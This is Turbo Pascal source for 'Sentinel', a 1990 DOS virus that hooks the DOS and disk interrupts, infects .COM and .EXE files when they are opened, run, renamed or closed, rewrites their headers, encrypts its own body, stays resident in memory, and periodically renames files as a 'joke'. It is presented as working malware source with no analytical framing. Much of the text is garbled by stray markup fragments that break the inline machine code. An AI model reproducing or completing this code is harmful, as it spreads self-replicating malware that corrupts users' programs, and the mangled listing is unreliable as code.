

{$A+,B-,D+,E-,F-,I-,L+,N-,O-,R-,S-,V-}
{$M 16384,0,655360}

program Sentinel;

const
	MaxLen		= $65;
	Open		= $3d;
	Rename		= $56;
	GetSetAttr	= $43;
	Create		= $3c;
	CreateNew	= $5b;
	Close		= $3e;
	ExecProg	= $4b;
	ExtOpenCreate 	= $6c;
	Copyright	=

' You won''t hear me, but you''ll feel me... (c) 1990 by Sentinel.'+
' With thanks to Borland. ';

type
	FileHeaderType	= record
			    case integer of
			    0: (Signature		: word;
				ImageSizeRem		: word;
				Pages512		: word;
				RelItems		: word;
				HeaderSize16		: word;
				MinPar			: word;
				MaxPar			: word;
				StartSS			: word;
				StartSP			: word;
				ChkSum			: word;
				StartIP			: word;
				StartCS			: word);
			    1: (JmpCode			: byte;
				JmpOfs			: word);
                          end;

	Registers	= record
			    case integer of
			      0: (bp,es,ds,di,si,dx,cx,bx,ax,ip,cs,flags: word);
			      1: (bpl,bph,esl,esh,dsl,dsh,dil,dih,sil,
				  sih,dl,dh,cl,ch,bl,bh,al,ah: byte);
			  end;

	FileNameType	= array[0..MaxLen] of char;

	CopyRightType	= array[1..Length(Copyright)] of char;

	BufferType	= record
			    FileHeader	: FileHeaderType;
			    Copyright	: CopyRightType;
			    ChkSum	: word;
			    GenNr	: word;
			    MyReg	: registers;
			    CritPtr	: pointer;
			    FileName	: FileNameType;
			    FileHandle  : word;
			  end;

	IntType	= record
		    case integer of
		      13:(Bytes1	: array[1..15] of byte;
			  HDiskPtr	: pointer;
			  Bytes2	: byte;
			  DiskPtr 	: pointer;
			  Bytes3	: byte;
			  Old13Ptr	: pointer);
		      21: (CodeBytes	: array[1..30] of byte;
			   InstrCode	: word;
			   Old21Ptr	: pointer);
		  end;

var
	Int21Ptr	: pointer absolute 0:$84;
	Int13Ptr	: pointer absolute 0:$4C;
	Int24Ptr	: pointer absolute 0:$90;
	Int40Ptr	: pointer absolute 0:$100;
	Int40Seg	: word absolute 0:$102;
	Int41Seg	: word absolute 0:$106;
	Int41SegHi	: byte absolute 0:$107;
	Int41SegLo	: byte absolute 0:$106;
var
	B		: ^BufferType;
const
	SentinelID	= byte('S');



procedure Buffer; forward;
procedure Install; forward;
procedure EnableInterrupts; inline($fb);
procedure DisableInterrupts; inline($fa);


function  ShiftRgt(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$ea/$d1/$d8/$e2/$fa);


function  ShiftLft(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$e0/$d1/$d2/$e2/$fa);


function MatchFunc(Func: word): boolean;
  inline($58/$80/$fc/$3d/$74/$27/$80/$fc/$56/$74/$22/$80/$fc/$43/$74/$1d/
	 $80/$fc/$3c/$74/$18/$80/$fc/$5b/$74/$13/$80/$fc/$3e/$74/$e/$80/
	 $fc/$4b/$74/9/$3d/0/$6c/$74/4/$33/$c0/$eb/2/$b0/1);


procedure Move(var Source, Dest; Count: word);
begin
  inline($1e/$c4/$7e/<dest></dest><source></source><count fc/$f3/$a4/$1f);="" end;="" function="" absaddr(sg,off:="" word):="" longint;="" begin=""></count><sg></sg><off $83/$d2/0/$89/$46/$fc/$89/$56/$fe);="" end;="" function="" exefile(sign:="" word):="" boolean;="" begin="" exefile="" :="(Sign" =="" $4d5a)="" or="" (sign="$5a4d);" end;="" function="" matchext(var="" buff):="" boolean;="" begin=""></off><buff 26/$c4/$04/$8c/$c2/$81/$ca/$20/$20/$d/$20/$20/="" $c6/$46/$ff/0/$3d/$2e/$63/$75/6/$81/$fa/$6f/$6d/$74/$b/$3d/="" $2e/$65/$75/$a/$81/$fa/$78/$65/$75/4/$c6/$46/$ff/1);="" end;="" procedure="" critproc;="" begin="" inline($5d/$b0/$03/$cf);="" end;="" procedure="" encrpt(offs,nr:="" word);="" var="" cnt="" :="" word;="" begin="" for="" cnt="" :="0" to="" (sizeof(copyrighttype)="" +="" sizeof(fileheadertype))="" div="" 2="" do="" memw[cseg:offs+cnt="" shl="" 1]="" :="MemW[CSeg:Offs+Cnt" shl="" 1]="" xor="" nr;="" end;="" function="" chknum(offs,len:="" word):="" word;="" var="" cnt="" :="" word;="" chk="" :="" word;="" begin="" chk="" :="0;" dec(len);="" for="" cnt="" :="0" to="" len="" do="" chk="" :="MemW[CSeg:Offs+Cnt" shl="" 1]="" xor="" chk;="" chknum="" :="Chk;" end;="" procedure="" int13;="" begin="" inline($5d/$80/$fc/$03/$75/$0f/$80/$fa/$80/$72/$05/="" $ea/="">0/>0/$ea/>0/>0/$ea/>0/>0);
end;


procedure JmpTo21;
begin
  inline($5d/$83/$c4/2/$ea/>0/>0);
end;


procedure MsFunc(var Reg: registers);
begin
  inline($1e/$c5/$76/<reg 46/$46/$b9/$b/0/$fc/$ad/$50/$e2/$fc/$9d/$58/="" $58/$58/$5b/$59/$5a/$5e/$5f/$1f/7/$55/$fa/$9c/$9a/="">0/>0/$5d/
	 $9c/$50/$53/$51/$52/$56/$57/$1e/6/$c5/$76/<reg b9/8/0/$46/="" $46/$8f/4/$e2/$fa/$83/$c6/6/$8f/4/$1f);="" end;="" procedure="" int21(flags,cs,ip,ax,bx,cx,dx,si,di,ds,es,bp:="" word);="" interrupt;="" var="" userreg="" :="" registers="" absolute="" bp;="" buff="" :="" ^buffertype;="" offs="" :="" word;="" label="" continue;="" function="" normalfunc:="" boolean;="" begin="" msfunc(buff^.myreg);="" normalfunc="" :="not" odd(buff^.myreg.flags);="" end;="" procedure="" pasteit;="" var="" intproc="" :="" ^inttype;="" attr="" :="" word;="" date,time="" :="" word;="" segm,offs="" :="" word;="" filesize="" :="" longint;="" saveheader="" :="" ^fileheadertype;="" procedure="" putit;="" var="" chk="" :="" word;="" begin="" buff^.chksum="" :="ChkNum(Ofs(Buffer),(SizeOf(CopyRightType)" +="" sizeof(fileheadertype))="" shr="" 1);="" encrpt(ofs(buffer),buff^.gennr);="" buff^.myreg.ah="" :="$40;" buff^.myreg.ds="" :="CSeg;" buff^.myreg.dx="" :="0;" buff^.myreg.cx="" :="Ofs(Buffer)" +="" sizeof(fileheadertype)="" +="" sizeof(copyrighttype)="" +="" 2;="" if="" normalfunc="" and="" (buff^.myreg.ax="Buff^.MyReg." cx)="" then="" begin="" buff^.myreg.ax="" :="$4200;" buff^.myreg.cx="" :="0;" buff^.myreg.dx="" :="0;" if="" normalfunc="" then="" begin="" buff^.myreg.ah="" :="$40;" buff^.myreg.cx="" :="SizeOf(FileHeaderType);" buff^.myreg.ds="" :="CSeg;" buff^.myreg.dx="" :="Ofs(SaveHeader^);" if="" normalfunc="" then;="" end;="" end;="" buff^.myreg.cx="" :="Time;" buff^.myreg.dx="" :="Date;" buff^.myreg.ax="" :="$5701;" msfunc(buff^.myreg);="" encrpt(ofs(buffer),buff^.gennr);="" end;="" function="" normalattr:="" boolean;="" begin="" normalattr="" :="False;" buff^.myreg.ax="" :="$4300;" if="" normalfunc="" then="" begin="" attr="" :="Buff^.MyReg.cx;" if="" attr="" and="" 4="0" then="" begin="" normalattr="" :="True;" if="" odd(attr)="" then="" begin="" buff^.myreg.ax="" :="$4301;" buff^.myreg.cx="" :="Attr" and="" $fffe;="" if="" not="" normalfunc="" then="" normalattr="" :="False;" end;="" end;="" end;="" end;="" begin="" intproc="" :="Ptr(CSeg,Ofs(Int13));" intproc^.old13ptr="" :="Int13Ptr;" with="" buff^="" do="" begin="" critptr="" :="Int24Ptr;" segm="" :="MyReg.ds;" offs="" :="MyReg.dx;" disableinterrupts;="" int13ptr="" :="Ptr(CSeg,Ofs(Int13));" int24ptr="" :="Ptr(CSeg,Ofs(CritProc));" enableinterrupts;="" if="" normalattr="" then="" begin="" myreg.ax="" :="$3d02;" if="" normalfunc="" then="" begin="" with="" myreg="" do="" begin="" bx="" :="ax;" ax="" :="$5700;" msfunc(myreg);="" time="" :="cx;" date="" :="dx;" ah="" :="$3f;" cx="" :="SizeOf(FileHeaderType);" ds="" :="CSeg;" dx="" :="Ofs(FileHeader);" if="" normalfunc="" then="" begin="" ax="" :="$4202;" cx="" :="0;" dx="" :="0;" if="" normalfunc="" then="" begin="" filesize="" :="ShiftLft(dx,16)" +="" ax;="" saveheader="" :="Ptr(CSeg,Ofs(Buffer)" +="" sizeof(buffertype));="" move(fileheader,saveheader^,sizeof(fileheadertype));="" if="" exefile(fileheader.signature)="" then="" begin="" if="" (filesize="" -="" absaddr(fileheader.headersize16="" +="" fileheader.startcs,0)="" -="" fileheader.startip=""></reg><>
				 Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(CopyRightType) + 2) and
				 (FileSize > 1000) and (SaveHeader^.MaxPar <> 0) then
				begin
				  with SaveHeader^ do
				    begin
				      StartCS := ShiftRgt(FileSize,4) - HeaderSize16;
				      StartIP := word(FileSize) mod $10 + Ofs(Install);
				      StartSS := StartCS;
				      StartSP := StartIP + Ofs(Buffer) - Ofs(Install) + SizeOf(BufferType) + $200;
				      Inc(FileSize,Ofs(Buffer) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2);
				      ImageSizeRem := word((FileSize - AbsAddr(HeaderSize16,0))) mod $200;
				      Pages512 := ShiftRgt(FileSize,9);
				      if word(FileSize) mod $200 <> 0 then Inc(Pages512);
				      PutIt;
				    end;
				end;
			    end
			  else
			    begin
			      if (((FileHeader.JmpCode) <> $e9) or
				  (FileSize - FileHeader.JmpOfs - 3 <>
				   Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2)) and
				  (FileSize > 1000) and (FileSize <= $ea00)="" then="" begin="" saveheader^.jmpcode="" :="$e9;" saveheader^.jmpofs="" :="FileSize" +="" ofs(install)="" -="" 3;="" putit;="" end;="" end;="" end;="" ah="" :="$3e;" msfunc(myreg);="" end;="" end;="" end;="" if="" odd(attr)="" then="" begin="" myreg.ax="" :="$4301;" myreg.cx="" :="Attr;" myreg.ds="" :="Segm;" myreg.dx="" :="Offs;" msfunc(myreg);="" end;="" end;="" disableinterrupts;="" int13ptr="" :="IntProc^.Old13Ptr;" int24ptr="" :="CritPtr;" enableinterrupts;="" end;="" end;="" function="" matchfile:="" boolean;="" var="" cnt="" :="" byte;="" begin="" cnt="" :="$ff;" repeat="" inc(cnt);="" until="" (mem[ds:offs+cnt]="0)" or="" (cnt=""> MaxLen);
  MatchFile := ((Cnt >= 1) and (Cnt <= maxlen))="" and="" matchext(mem[ds:offs+cnt-4]);="" end;="" procedure="" biteit;="" begin="" if="" matchfile="" then="" begin="" buff^.myreg.ds="" :="ds;" buff^.myreg.dx="" :="Offs;" pasteit;="" end;="" inline($83/$c4/4/$5d/$8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);="" jmpto21;="" end;="" procedure="" catchit;="" begin="" msfunc(userreg);="" if="" buff^.filename[0]="#0" then="" begin="" move(mem[ds:offs],buff^.filename,maxlen);="" if="" matchfile="" and="" not="" odd(flags)="" then="" buff^.filehandle="" :="ax" else="" buff^.filename[0]="" :="#0;" end;="" end;="" begin="" enableinterrupts;="" buff="" :="Ptr(CSeg,Ofs(Buffer));" offs="" :="dx;" case="" userreg.ah="" of="" open:="" if="" userreg.al="" and="" 7="0" then="" biteit="" else="" catchit;="" create:="" catchit;="" createnew:="" begin="" catchit;="" if="" odd(flags)="" and="" (ax="80)" and="" matchfile="" then="" begin="" buff^.myreg.ds="" :="ds;" buff^.myreg.dx="" :="Offs;" pasteit;="" end;="" end;="" close:="" begin="" msfunc(userreg);="" if="" (bx="Buff^.FileHandle)" and="" (buff^.filename[0]=""></=><> #0) then
	       begin
		 Buff^.MyReg.ds := CSeg;
		 Buff^.MyReg.dx := Ofs(Buff^.FileName);
		 PasteIt;
		 Buff^.FileName[0] := #0;
	       end;
	   end;
    ExecProg: BiteIt;
    Rename: BiteIt;
    GetSetAttr: if UserReg.al =	SentinelID then
		  begin
		    ax := CSeg;
		    flags := flags and $fffe;
		  end
		else
		  BiteIt;
    ExtOpenCreate: if ax = $6c00 then
		     begin
		       Offs := si;
		       if UserReg.bl and 7 = 0 then
			 BiteIt
		       else
			 CatchIt;
		     end
		   else
		     goto Continue
  else
    begin
      Continue: inline($8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);
      JmpTo21;
    end;
  end;
end;


procedure Install;
var
	Buff		: ^BufferType;
	Sg		: word;
	PrefSeg		: word;
	Base		: word;
	IntProc       	: ^IntType;


function WrongFunc: boolean;
  inline($55/$b8/<sentinelid></sentinelid><getsetattr></getsetattr><sg b0/1/$72/2/$32/$c0);="" procedure="" ren(sg,offs,sg,offs:="" word);="" inline($5a/$1f/$5f/7/$b4/$56/$cd/$21);="" procedure="" solvebase;="" begin="" base="" :="MemW[SSeg:SPtr+4]-13;" end;="" procedure="" searchint13(memlen:="" word);="" var="" offs="" :="" word;="" begin="" memlen="" :="MemLen" shl="" 9;="" offs="" :="$ffff;" repeat="" inc(offs);="" until="" (((meml[int41seg:offs]="$7380fa80)" or="" (meml[int41seg:offs]="$7580c2f6))" and="" (memw[int41seg:offs+5]="$40cd))" or="" (offs=""> MemLen);
  if Offs < memlen="" then="" intproc^.hdiskptr="" :="Ptr(Int41Seg,Offs);" end;="" function="" empty:="" boolean;="" var="" offs="" :="" word;="" begin="" offs="" :="0;" while="" (mem[sg:offs]="Mem[CSeg:Offs+Base])" and="" (offs="">< ofs(int13))="" do="" inc(offs);="" empty="" :="Offs"><> Ofs(Int13);
end;


function NormalFunc: boolean;
begin
  MsFunc(Buff^.MyReg);
  NormalFunc := not Odd(Buff^.MyReg.flags);
end;


function FreeSpace: boolean;
begin
  FreeSpace := False;
  if AbsAddr(CSeg,Base+Ofs(Buffer)+SizeOf(BufferType)) < absaddr(buff^.myreg.ds,0)="" then="" if="" exefile(buff^.fileheader.signature)="" then="" freespace="" :="AbsAddr(Buff^.FileHeader.StartSS+PrefSeg+$10,Buff^.FileHeader.StartSP)">< absaddr(buff^.myreg.ds,0)="" else="" freespace="" :="True;" end;="" procedure="" joke;="" var="" envsg="" :="" word;="" orgcnt="" :="" word;="" cnt="" :="" word;="" begin="" envsg="" :="MemW[PrefSeg:$2c];" orgcnt="" :="0;" while="" memw[envsg:orgcnt]=""><> 0 do Inc(OrgCnt);
  Inc(OrgCnt,4);
  Cnt := OrgCnt;
  Move(Mem[EnvSg:Cnt],Buff^.FileName,MaxLen);
  while Mem[EnvSg:Cnt] <> 0 do Inc(Cnt);
  MemL[EnvSg:Cnt-4] := longint($4d4f432e);
  DisableInterrupts; Int13Ptr := Ptr(CSeg,Ofs(Int13) + Base); EnableInterrupts;
  Ren(EnvSg,OrgCnt,Seg(Buff^.FileName),Ofs(Buff^.FileName));
  DisableInterrupts; Int13Ptr := IntProc^.Old13Ptr; EnableInterrupts;
end;


begin
  inline($8c/$5e/<prefseg); solvebase;="" base="" :="Base" -="" ofs(install);="" buff="" :="Ptr(CSeg,Base+Ofs(Buffer));" buff^.gennr="" :="ChkNum(Ofs(Buffer)+Base,(SizeOf(CopyRightType)+SizeOf(FileHeaderType))" shr="" 1="" +="" 1);="" encrpt(ofs(buffer)+base,buff^.gennr);="" inc(buff^.gennr);="" intproc="" :="Ptr(CSeg,Base+Ofs(Int13));" with="" intproc^="" do="" begin="" hdiskptr="" :="Int13Ptr;" diskptr="" :="Int13Ptr;" old13ptr="" :="Int13Ptr;" if="" (int40seg="$f000)" then="" begin="" diskptr="" :="Int40Ptr;" if="" int41seg="$f000" then="" searchint13($80)="" else="" if="" ((int41seghi="">= $c8) and (Int41SegHi <= $f3))="" and="" (int41seglo="" and="" $7f="0)" and="" (memw[int41seg:0]="$aa55)" then="" searchint13(mem[int41seg:2]);="" end;="" end;="" if="" buff^.gennr="" mod="" $20="0" then="" joke;="" if="" wrongfunc="" or="" empty="" then="" begin="" intproc="" :="Ptr(CSeg,Base+Ofs(MsFunc));" intproc^.instrcode="" :="$cdfb;" intproc^.old21ptr="" :="Ptr($9090,$9021);" with="" buff^.myreg="" do="" begin="" ah="" :="$49;" es="" :="PrefSeg;" if="" normalfunc="" then="" begin="" ah="" :="$48;" bx="" :="$ffff;" msfunc(buff^.myreg);="" if="" bx=""> (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2 then
		begin
		  Dec(bx,(Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2);
		  ds := es + bx;
		  if FreeSpace then
		    begin
		      ah := $4a;
		      if NormalFunc then
			begin
			  bx := (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2;
			  Dec(MemW[PrefSeg:2],bx);
			  ah := $4a;
			  es := ds + 1;
			  Dec(bx);
			  MsFunc(Buff^.MyReg);
			  MemW[ds:1] := 8;
			  Mem[PrefSeg-1:0] := $5a;
			  Buff^.FileName[0] := #0;
			  MemL[CSeg:Ofs(MsFunc)-8+Base] := MemL[0:$84];
			  IntProc^.Old21Ptr := Int21Ptr;
			  IntProc^.InstrCode := $9a9c;
			  Move(Mem[CSeg:Base],Mem[es:0],Ofs(Buffer) + SizeOf(BufferType));
			  DisableInterrupts; Int21Ptr := Ptr(es,Ofs(Int21)); EnableInterrupts;
			end;
                    end;
		end
	      else
		begin
		  ah := $4a;
		  if not NormalFunc then
		    begin
		      ah := $4a;
		      MsFunc(Buff^.MyReg);
		    end;
		end;
	    end;
	end;
    end;
  if ExeFile(Buff^.FileHeader.Signature) then
      inline($8e/$46/<prefseg></prefseg><prefseg></prefseg><buff></buff><prefseg 8b/$c8/$ad/$8b/=""></prefseg><prefseg fa/="" $8e/$d1/$8b/$e2/$fb/$06/$1f/$50/$53/$cb)="" else=""></prefseg><buff fc/$ad/$2e/$a3/$00/$01/$ac/$2e/$a2/$02/="" $01/$89/$ec/$5d/$b8/$00/$01/$50/$0e/$0e/$1f/$07/$c3);="" end;="" procedure="" buffer;="" begin="" inline(="">0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
	 >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0);

end;


procedure Quit;
begin
  inline($b8/0/0/$8e/$d8);
  Halt;
end;



begin
  B := @Buffer;
  if (Ofs(B^.ChkSum) - Ofs(B^)) mod 4 = 0 then
    begin
      B^.Copyright := CopyRight;
      with B^.FileHeader do
	begin
	  StartSS := SSeg - PrefixSeg - $10;
	  StartSp := SPtr - $1000;
	  StartCS := CSeg - PrefixSeg - $10;
	  StartIP := Ofs(Quit);
	  Signature := $4d5a;
	end;
      B^.ChkSum := ChkNum(Ofs(Buffer),(SizeOf(CopyRightType) + SizeOf(FileHeaderType)) shr 1);
      Encrpt(Ofs(Buffer),$ffff);
      MemW[CSeg:Ofs(Quit) + 4] := DSeg;
      Inline($8e/$1e/PrefixSeg);
      Install;
    end
  else
    WriteLn('Parity error. ''Copyright'' length must be greater with ',
	    4 - (Ofs(B^.ChkSum) - Ofs(B^)) mod 4,' byte(s).');
end.

</buff></=></prefseg);></sg></=></reg></buff>